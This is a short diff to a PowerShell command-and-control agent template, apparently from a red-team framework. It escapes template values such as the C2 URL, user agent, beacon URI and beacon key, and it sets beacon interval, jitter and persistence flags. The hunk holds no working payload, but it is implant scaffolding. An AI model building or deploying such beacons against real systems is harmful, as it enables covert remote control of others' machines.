@@ -7,15 +7,15 @@ Do NOT run this file directly — use the C2 Generate Agent feature.
 
 param()
 
-$global:C2URL = "{{.C2URL}}"
+$global:C2URL = "{{ps .C2URL}}"
 $global:Interval = {{.Interval}}
 $global:Jitter = {{.Jitter}}
-$global:UserAgent = "{{.UserAgent}}"
+$global:UserAgent = "{{ps .UserAgent}}"
 $global:Persist = {{if .Persist}}$true{{else}}$false{{end}}
-$global:Protocol = "{{.Protocol}}"
-$global:BeaconURI = "{{.BeaconURI}}"
-$global:BeaconMethod = "{{.Method}}"
-$global:BeaconKey = "{{.BeaconKey}}"
+$global:Protocol = "{{ps .Protocol}}"
+$global:BeaconURI = "{{ps .BeaconURI}}"
+$global:BeaconMethod = "{{ps .Method}}"
+$global:BeaconKey = "{{ps .BeaconKey}}"
 $global:ListenerID = {{if .ListenerID}}{{.ListenerID}}{{else}}0{{end}}
 
 $global:AgentUUID = $null
